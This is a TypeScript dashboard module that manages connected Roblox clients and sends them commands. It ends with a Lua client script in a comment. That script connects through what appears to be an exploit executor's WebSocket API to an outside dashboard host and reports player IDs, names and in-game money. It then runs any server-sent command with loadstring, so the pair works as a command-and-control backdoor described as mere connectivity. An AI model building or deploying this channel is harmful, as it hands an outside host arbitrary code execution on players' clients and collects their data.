
/**
 * WebSocket Server implementation for Roblox client connectivity
 * This utility provides a WebSocket server that Roblox clients can connect to
 */

// Store connected clients
interface ConnectedClient {
  id: string;
  socket: WebSocket | null;
  username: string;
  place: string;
  userId: number;
  money?: number;
  lastSeen: string;
  online: boolean;
  additionalData?: Record<string, any>;
}

class WebSocketManager {
  private static instance: WebSocketManager;
  private server: WebSocket | null = null;
  private clients: Map<string, ConnectedClient> = new Map();
  private listeners: Map<string, Set<(data: any) => void>> = new Map();
  private wsUrl: string;

  private constructor() {
    // Use the deployed app URL for WebSocket connection
    this.wsUrl = this.getWebSocketUrl();
    
    // Initialize WebSocket server if we're in a browser environment
    if (typeof window !== 'undefined') {
      this.setupServer();
    }
  }

  private getWebSocketUrl(): string {
    // Use secure WebSocket for production, regular for localhost
    const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    const protocol = isLocalhost ? 'ws://' : 'wss://';
    const host = isLocalhost ? window.location.host : 'lurkcc-dashboard.lovable.app';
    return `${protocol}${host}/ws`;
  }

  public static getInstance(): WebSocketManager {
    if (!WebSocketManager.instance) {
      WebSocketManager.instance = new WebSocketManager();
    }
    return WebSocketManager.instance;
  }

  private setupServer() {
    console.log("Setting up WebSocket server for Roblox client connections");
    
    try {
      // In development, use the mock implementation
      if (import.meta.env.DEV) {
        this.simulateClientConnections();
      } else {
        // In production, attempt to establish a real WebSocket connection
        // This would connect to a WebSocket server you'd need to set up on your backend
        this.connectToServer();
      }
    } catch (error) {
      console.error("Error setting up WebSocket server:", error);
      // Fallback to simulation in case of error
      this.simulateClientConnections();
    }

    // Listen for window unload to properly close connections
    window.addEventListener('beforeunload', () => {
      this.clients.forEach(client => {
        if (client.socket) {
          client.socket.close();
        }
      });
    });
  }

  private connectToServer() {
    console.log(`Attempting to connect to WebSocket server at ${this.wsUrl}`);
    
    try {
      const socket = new WebSocket(this.wsUrl);
      
      socket.onopen = () => {
        console.log("WebSocket connection established");
        this.server = socket;
        
        // Send authentication if needed
        // socket.send(JSON.stringify({ action: "authenticate", token: "your-auth-token" }));
      };
      
      socket.onmessage = (event) => {
        try {
          const message = JSON.parse(event.data);
          this.handleServerMessage(message);
        } catch (error) {
          console.error("Error parsing WebSocket message:", error);
        }
      };
      
      socket.onclose = () => {
        console.log("WebSocket connection closed");
        this.server = null;
        
        // Attempt to reconnect after a delay
        setTimeout(() => this.connectToServer(), 5000);
      };
      
      socket.onerror = (error) => {
        console.error("WebSocket error:", error);
        socket.close();
      };
    } catch (error) {
      console.error("Failed to connect to WebSocket server:", error);
      // Fallback to simulation
      this.simulateClientConnections();
    }
  }

  private handleServerMessage(message: any) {
    console.log("Received message from server:", message);
    
    if (message.action === "client_connected") {
      this.handleClientConnection(message.data);
    } else if (message.action === "client_disconnected") {
      this.handleClientDisconnection(message.data.id);
    } else if (message.action === "client_status_changed") {
      const client = this.clients.get(message.data.id);
      if (client) {
        client.online = message.data.online;
        client.lastSeen = message.data.lastSeen || new Date().toISOString();
        this.emit('clientStatusChanged', client);
      }
    }
  }

  // Method to get all connected clients
  public getConnectedClients(): ConnectedClient[] {
    return Array.from(this.clients.values());
  }

  // Method to handle client connection
  public handleClientConnection(clientData: any) {
    const clientId = clientData.id || `client-${this.clients.size + 1}`;
    
    // Create a client record
    const client: ConnectedClient = {
      id: clientId,
      socket: null, // In a real implementation, this would be the actual socket
      username: clientData.username || `Player${this.clients.size + 1}`,
      place: clientData.place || "Unknown Place",
      userId: clientData.userId || 0,
      lastSeen: new Date().toISOString(),
      online: true,
      additionalData: clientData.additionalData || {}
    };

    if (clientData.money) {
      client.money = clientData.money;
    }

    // Add to clients map
    this.clients.set(clientId, client);
    
    // Emit client connected event
    this.emit('clientConnected', client);
    
    console.log(`Client connected: ${clientId}`, client);
    
    return clientId;
  }

  // Method to send a command to specific clients
  public sendCommandToClients(clientIds: string[], command: string) {
    const payload = {
      action: "execute_command",
      data: {
        command: command
      }
    };

    console.log(`Sending command to clients: ${clientIds.join(', ')}`, payload);

    // In a real implementation, this would send the payload to each client's WebSocket
    if (this.server && this.server.readyState === WebSocket.OPEN) {
      // Send to the server, which will route to the appropriate clients
      this.server.send(JSON.stringify({
        action: "broadcast_command",
        clientIds: clientIds,
        payload: payload
      }));
    } else {
      // If we're in simulation mode or disconnected
      clientIds.forEach(clientId => {
        const client = this.clients.get(clientId);
        if (client && client.online) {
          // Simulate sending to the client
          console.log(`Simulating command to client ${clientId}:`, payload);
        }
      });
    }

    return true;
  }

  // Method to handle client disconnection
  public handleClientDisconnection(clientId: string) {
    const client = this.clients.get(clientId);
    if (client) {
      client.online = false;
      client.lastSeen = new Date().toISOString();
      
      // Emit client disconnected event
      this.emit('clientDisconnected', client);
      
      console.log(`Client disconnected: ${clientId}`);
    }
  }

  // Method to register event listeners
  public on(event: string, callback: (data: any) => void) {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, new Set());
    }
    this.listeners.get(event)?.add(callback);
    
    return () => {
      this.listeners.get(event)?.delete(callback);
    };
  }

  // Method to emit events
  private emit(event: string, data: any) {
    this.listeners.get(event)?.forEach(callback => {
      callback(data);
    });
  }

  // For demonstration only: simulate client connections/disconnections
  private simulateClientConnections() {
    // Create some initial mock clients
    const mockClientData = [
      {
        username: "PlayerOne",
        place: "Natural Disaster Survival",
        userId: 1001,
        money: 5000,
        additionalData: {
          level: 10,
          inventory: ["sword", "shield"]
        }
      },
      {
        username: "PlayerTwo",
        place: "Adopt Me!",
        userId: 1002,
        money: 7500,
        additionalData: {
          pets: ["dog", "cat", "dragon"]
        }
      },
      {
        username: "PlayerThree",
        place: "Brookhaven",
        userId: 1003,
        money: 3200
      },
      {
        username: "PlayerFour",
        place: "Arsenal",
        userId: 1004,
        money: 8900
      },
      {
        username: "PlayerFive",
        place: "Murder Mystery 2",
        userId: 1005,
        money: 12000
      }
    ];

    // Add mock clients
    mockClientData.forEach(data => {
      this.handleClientConnection(data);
    });

    // Simulate random client status changes
    setInterval(() => {
      const clientIds = Array.from(this.clients.keys());
      if (clientIds.length > 0) {
        const randomClientId = clientIds[Math.floor(Math.random() * clientIds.length)];
        const client = this.clients.get(randomClientId);
        
        if (client && Math.random() > 0.7) {
          client.online = !client.online;
          client.lastSeen = new Date().toISOString();
          
          // Emit status change event
          this.emit('clientStatusChanged', client);
        }
      }
    }, 20000); // Every 20 seconds
  }
}

export default WebSocketManager;

// Example Lua code for Roblox clients to connect to this WebSocket server:
/*
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Function to establish WebSocket connection
local function connectToWebSocket()
    local websocket
    
    -- Try to create a WebSocket connection
    local success, error = pcall(function()
        websocket = WebSocket.connect("wss://lurkcc-dashboard.lovable.app/ws")
    end)
    
    if not success then
        warn("Failed to connect to WebSocket: " .. tostring(error))
        return
    end
    
    -- Handle incoming messages
    websocket.OnMessage:Connect(function(message)
        local success, data = pcall(function()
            return HttpService:JSONDecode(message)
        end)
        
        if success then
            -- Handle different message types
            if data.action == "execute_command" then
                local command = data.data.command
                print("Received command: " .. command)
                
                -- Execute the command
                pcall(function()
                    loadstring(command)()
                end)
            end
        else
            warn("Failed to parse message: " .. message)
        end
    end)
    
    -- Send initial client data
    local clientData = {
        action = "client_connected",
        data = {
            userId = player.UserId,
            username = player.Name,
            place = game.PlaceId,
            money = player.leaderstats and player.leaderstats.Money and player.leaderstats.Money.Value or 0,
            additionalData = {
                -- Add any additional data you want to send here
            }
        }
    }
    
    websocket:Send(HttpService:JSONEncode(clientData))
    
    -- Keep sending heartbeat
    spawn(function()
        while wait(30) do
            if websocket.ReadyState == 1 then -- 1 means the connection is open
                websocket:Send(HttpService:JSONEncode({
                    action = "heartbeat",
                    data = {
                        userId = player.UserId
                    }
                }))
            else
                break
            end
        end
    end)
    
    return websocket
end

-- Start connection
local ws = connectToWebSocket()

-- Reconnect if disconnected
spawn(function()
    while wait(60) do -- Check every minute
        if not ws or ws.ReadyState ~= 1 then
            ws = connectToWebSocket()
        end
    end
end)
*/
